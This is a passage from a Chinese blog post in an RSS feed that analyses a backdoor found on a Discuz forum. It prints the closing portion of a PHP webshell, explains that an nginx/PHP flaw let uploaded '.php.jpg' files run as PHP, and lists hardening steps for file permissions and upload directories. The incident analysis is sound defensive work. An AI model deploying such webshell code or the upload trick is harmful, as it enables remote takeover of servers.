<span style="color: #969896; background-color: #1d1f21;"> </span>   $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$arg['name'] &amp;&amp; $arg['name'] = 'form1';
<span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" metho<span style="text-decoration: underline;">d=\"$arg[method]\" $arg[target]&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['title']) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;'.$arg['title'].' &amp;raquo;&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

function maketext($arg = array()){
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$arg['cols'] &amp;&amp; $arg['cols'] = 100;
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$arg['rows'] &amp;&amp; $arg['rows'] = 25;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name<span style="text-decoration: underline;">]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;");</span>
}

function formfooter($name = ''){
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$name &amp;&amp; $name = 'submit';
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;&lt;input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value=<span style="text-decoration: underline;">"Submit"&gt;&lt;/p&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/form&gt;');
}

function goback(){
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $self, $nowpath;
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;form action="'.$self.'" method="post"&gt;&lt;input type="hidden" name="action"<span style="text-decoration: underline;"> value="file" /&gt;&lt;input type="hidden" name="dir" value="'.$nowpath.'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;');</span>
}

function formfoot(){
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/form&gt;');
}

function encode_pass($pass) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $pass = md5('angel'.$pass);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $pass = md5($pass.'angel');
<span style="color: #969896; background-color: #1d1f21;"> </span>   $pass = md5('angel'.$pass.'angel');
<span style="color: #969896; background-color: #1d1f21;"> </span>   return $pass;
}

function pr($s){
<span style="color: #969896; background-color: #1d1f21;"> </span>   echo "&lt;pre&gt;".print_r($s).'&lt;/pre&gt;';
}

?&gt;
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #8abeb7;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc_server/data/avatar
</li>
<li>uc_server/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
    </channel>
</rss>